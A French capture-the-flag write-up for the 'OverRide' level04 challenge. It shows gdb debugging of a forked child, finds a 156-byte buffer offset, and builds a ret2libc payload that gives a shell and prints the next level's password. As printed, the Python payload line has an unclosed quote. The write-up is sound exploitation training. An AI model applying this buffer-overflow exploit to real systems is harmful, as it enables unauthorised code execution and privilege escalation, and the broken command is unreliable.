## LEVEL 04

Au lancement du programme on nous demande un shellcode. Quoi que l'on entre le programme exit.

On lance alors le binaire avec gdb pour voir si l'entrée segfault. En entrant une string dépassant le buffer le programme boucle à l'infini.

On remarque dans cutter que le programme lance un fork, si le fork est égal à 0 programme va alors se mettre dans une boucle infini. C'est l'information que dont nous avions besoin.

Un indice nous est donné lorsque le programme exit.

    level04@OverRide:~$ ./level04
    Give me some shellcode, k
    
    child is exiting...


Grâce à gdb on peut alors follow le process du child et ainsi éviter la boucle infinie pour avoir l'offset du buffer.

    (gdb) set follow-fork-mode child
    (gdb) r
    Starting program: /home/users/level04/level04
    [New process 1716]
    Give me some shellcode, k
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    
    Program received signal SIGSEGV, Segmentation fault.
    [Switching to process 1716]
    0x41326641 in ?? ()

0x41326641 ce qui nous donne un offset de 156.

On va alors procéder comme dans le level01.

On trouve l'adresse du system, l'adresse de l'exit et l'adresse de /bin/sh pour créer notre payload.

    (gdb) info function system
    All functions matching regular expression "system":
    
    Non-debugging symbols:
    0xf7e6aed0  __libc_system
    ...
    
    (gdb) info function exit
    All functions matching regular expression "exit":
    
    Non-debugging symbols:
    0xf7e5eb70  exit
    ...

Maintenant l'adresse du /bin/sh.

    (gdb) info proc map
    No current process: you must name one.
    (gdb) r
    Starting program: /home/users/level04/level04
    
    Program received signal SIGSEGV, Segmentation fault.
    0x080486f6 in main ()
    (gdb) Give me some shellcode, k
    info pinfo proc map
    process 1730
    Mapped address spaces:
    
            Start Addr   End Addr       Size     Offset objfile
             0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
             0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
             0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
            0xf7e2b000 0xf7e2c000     0x1000        0x0
            0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
            0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
            0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
            0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
            0xf7fd0000 0xf7fd4000     0x4000        0x0
            0xf7fda000 0xf7fdb000     0x1000        0x0
            0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
            0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
            0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
            0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
            0xfffdd000 0xffffe000    0x21000        0x0 [stack]
            
    (gdb) find 0xf7e2b000, 0xf7fcc000, "/bin/sh"
    0xf7f897ec
    1 pattern found.
Bien, on a nos 3 adresses :

    System	0xf7e6aed0   
    Exit	0xf7e5eb70  
    Bin/sh	0xf7f897ec

On créé alors notre payload :

_Overflow + System + Exit + /bin/sh_

```
$ python -c "print 'A' * 156+ '\xd0\xae\xe6\xf7 + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'" > /tmp/payload
```

    level04@OverRide:~$ cat /tmp/payload - | ./level04
    Give me some shellcode, k
    whoami
    level05
    cat /home/users/level05/.pass
    3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN




